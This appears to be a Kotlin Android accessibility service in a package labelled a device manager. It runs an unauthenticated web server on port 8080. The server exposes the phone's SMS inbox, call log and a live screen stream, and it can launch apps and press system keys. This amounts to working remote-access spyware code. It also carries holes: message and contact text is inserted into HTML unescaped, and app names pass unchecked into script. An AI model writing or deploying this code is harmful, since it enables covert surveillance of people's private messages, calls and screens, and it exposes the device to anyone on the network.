package com.example.devicemanager

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.CallLog
import android.view.accessibility.AccessibilityEvent
import fi.iki.elonen.NanoHTTPD
import java.io.ByteArrayInputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class RemoteControlService : AccessibilityService() {

    private var server: WebServer? = null

    companion object {
        var instance: RemoteControlService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            if (server == null) {
                server = WebServer(8080)
                server?.start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        server?.stop()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    private fun getSmsHtml(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null,
                null,
                "date DESC LIMIT 40"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                while (it.moveToNext()) {
                    val address = it.getString(addrIdx) ?: "Unknown"
                    val body = it.getString(bodyIdx) ?: ""
                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
                    sb.append("<div class='card'><b>From: ").append(address).append("</b><small style='float:right'>")
                      .append(date).append("</small><p>").append(body).append("</p></div>")
                }
            }
        } catch (e: Exception) {
            return "<div class='card'><p>Error reading SMS: ${e.message}</p></div>"
        }
        return if (sb.isEmpty()) "<div class='card'><p>No SMS found in inbox.</p></div>" else sb.toString()
    }

    private fun getCallLogsHtml(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 40"
            )
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext()) {
                    val number = it.getString(numIdx) ?: "Unknown"
                    val name = it.getString(nameIdx) ?: number
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Call"
                    }
                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
                    val duration = it.getString(durIdx) ?: "0"
                    sb.append("<div class='card'><b>").append(name).append(" (").append(type).append(")</b>")
                      .append("<small style='float:right'>").append(date).append("</small><p>")
                      .append(number).append(" | Duration: ").append(duration).append("s</p></div>")
                }
            }
        } catch (e: Exception) {
            return "<div class='card'><p>Error reading call logs: ${e.message}</p></div>"
        }
        return if (sb.isEmpty()) "<div class='card'><p>No call logs found.</p></div>" else sb.toString()
    }

    inner class WebServer(port: Int) : NanoHTTPD(port) {
        override fun serve(session: IHTTPSession): Response {
            val uri = session.uri
            val params = session.parameters

            // 1. Navigation Action Handlers
            if (uri == "/key") {
                when (params["action"]?.firstOrNull()) {
                    "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                    "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                    "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                    "lock" -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                }
                return newFixedLengthResponse("OK")
            }

            // 2. Launch Application
            if (uri == "/launch") {
                val pkg = params["pkg"]?.firstOrNull()
                if (!pkg.isNullOrEmpty()) {
                    val intent = packageManager.getLaunchIntentForPackage(pkg)?.apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    if (intent != null) {
                        startActivity(intent)
                        return newFixedLengthResponse("Launched $pkg")
                    }
                    return newFixedLengthResponse("Failed: Launch intent null")
                }
            }

            // 3. Screen Frame Endpoint
            if (uri == "/api/screen") {
                val bytes = ScreenCaptureService.latestJpegBytes
                return if (bytes != null && bytes.isNotEmpty()) {
                    val res = newFixedLengthResponse(
                        Response.Status.OK,
                        "image/jpeg",
                        ByteArrayInputStream(bytes),
                        bytes.size.toLong()
                    )
                    res.addHeader("Cache-Control", "no-cache, no-store, must-revalidate")
                    res.addHeader("Pragma", "no-cache")
                    res.addHeader("Expires", "0")
                    res
                } else {
                    newFixedLengthResponse(Response.Status.NO_CONTENT, "text/plain", "Waiting for capture frame...")
                }
            }

            // 4. Data Endpoints
            if (uri == "/api/sms") return newFixedLengthResponse(Response.Status.OK, "text/html", getSmsHtml())
            if (uri == "/api/calls") return newFixedLengthResponse(Response.Status.OK, "text/html", getCallLogsHtml())

            // 5. Installed Apps
            val pm = packageManager
            val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
                .sortedBy { it.loadLabel(pm).toString() }

            val appsHtml = StringBuilder()
            for (app in packages) {
                val name = app.loadLabel(pm).toString()
                val pkg = app.packageName
                appsHtml.append("<li><span><b>").append(name).append("</b><br><small>").append(pkg)
                        .append("</small></span><button onclick=\"launchApp('").append(pkg)
                        .append("')\">Open</button></li>")
            }

            // 6. Web Dashboard
            val html = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <title>Device Hub</title>
                    <style>
                        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #121212; color: #fff; margin: 0; padding: 16px; }
                        .nav-bar { display: flex; gap: 8px; margin-bottom: 16px; background: #1e1e1e; padding: 10px; border-radius: 8px; }
                        button { background: #2563eb; color: #fff; border: none; border-radius: 6px; padding: 10px 14px; font-weight: bold; cursor: pointer; }
                        .tab-btn { background: #2d2d2d; flex: 1; text-align: center; }
                        .active { background: #2563eb !important; }
                        .card { background: #1e1e1e; padding: 12px; margin: 8px 0; border-radius: 8px; border-left: 4px solid #2563eb; }
                        ul { list-style: none; padding: 0; margin: 0; }
                        li { background: #1e1e1e; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
                        .tab-pane { display: none; }
                        .show { display: block; }
                        .screen-box { display: flex; flex-direction: column; align-items: center; gap: 12px; }
                        #screenImg { width: 100%; max-width: 320px; border-radius: 12px; border: 2px solid #333; background: #000; min-height: 480px; object-fit: contain; }
                        #statusText { font-size: 13px; color: #888; }
                    </style>
                </head>
                <body>
                    <div class="nav-bar">
                        <button onclick="fetch('/key?action=back')">Back</button>
                        <button onclick="fetch('/key?action=home')">Home</button>
                        <button onclick="fetch('/key?action=recents')">Recents</button>
                        <button onclick="fetch('/key?action=lock')" style="background:#dc2626;">Lock</button>
                    </div>

                    <div style="display:flex; gap:6px; margin-bottom:16px;">
                        <button class="tab-btn active" onclick="switchTab('apps', this)">Apps</button>
                        <button class="tab-btn" onclick="openScreenTab(this)">Screen</button>
                        <button class="tab-btn" onclick="loadTab('sms', this)">Messages</button>
                        <button class="tab-btn" onclick="loadTab('calls', this)">Calls</button>
                    </div>

                    <div id="apps" class="tab-pane show">
                        <ul>$appsHtml</ul>
                    </div>

                    <div id="screen" class="tab-pane">
                        <div class="screen-box">
                            <div style="display:flex; gap:10px; width: 100%; max-width: 320px;">
                                <button id="streamBtn" style="flex:1" onclick="toggleStream()">Start Stream</button>
                                <button style="background:#374151" onclick="fetchFrame()">Refresh</button>
                            </div>
                            <span id="statusText">Ready</span>
                            <img id="screenImg" alt="Screen display" />
                        </div>
                    </div>

                    <div id="sms" class="tab-pane">Loading messages...</div>
                    <div id="calls" class="tab-pane">Loading call logs...</div>

                    <script>
                        let streamInterval = null;
                        let isFetching = false;

                        function switchTab(id, elem) {
                            stopStream();
                            document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('show'));
                            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                            document.getElementById(id).classList.add('show');
                            elem.classList.add('active');
                        }

                        function loadTab(id, elem) {
                            switchTab(id, elem);
                            fetch('/api/' + id)
                                .then(r => r.text())
                                .then(html => { document.getElementById(id).innerHTML = html; })
                                .catch(err => { document.getElementById(id).innerHTML = '<p>Failed to load: ' + err + '</p>'; });
                        }

                        function openScreenTab(elem) {
                            switchTab('screen', elem);
                            fetchFrame();
                        }

                        function fetchFrame() {
                            if (isFetching) return;
                            isFetching = true;
                            const status = document.getElementById('statusText');

                            fetch('/api/screen?t=' + Date.now())
                                .then(res => {
                                    if (res.status === 204) throw new Error("Waiting for capture permission...");
                                    if (!res.ok) throw new Error("Server error " + res.status);
                                    return res.blob();
                                })
                                .then(blob => {
                                    const img = document.getElementById('screenImg');
                                    if (img.src.startsWith('blob:')) {
                                        URL.revokeObjectURL(img.src);
                                    }
                                    img.src = URL.createObjectURL(blob);
                                    status.innerText = "Updated: " + new Date().toLocaleTimeString();
                                    isFetching = false;
                                })
                                .catch(err => {
                                    status.innerText = err.message;
                                    isFetching = false;
                                });
                        }

                        function toggleStream() {
                            const btn = document.getElementById('streamBtn');
                            if (streamInterval) {
                                stopStream();
                            } else {
                                btn.innerText = "Stop Stream";
                                btn.style.background = "#dc2626";
                                fetchFrame();
                                streamInterval = setInterval(fetchFrame, 800);
                            }
                        }

                        function stopStream() {
                            if (streamInterval) {
                                clearInterval(streamInterval);
                                streamInterval = null;
                                const btn = document.getElementById('streamBtn');
                                if (btn) {
                                    btn.innerText = "Start Stream";
                                    btn.style.background = "#2563eb";
                                }
                            }
                        }

                        function launchApp(pkg) {
                            fetch('/launch?pkg=' + pkg)
                                .then(r => r.text())
                                .then(msg => alert(msg));
                        }
                    </script>
                </body>
                </html>
            """.trimIndent()

            return newFixedLengthResponse(Response.Status.OK, "text/html", html)
        }
    }
}
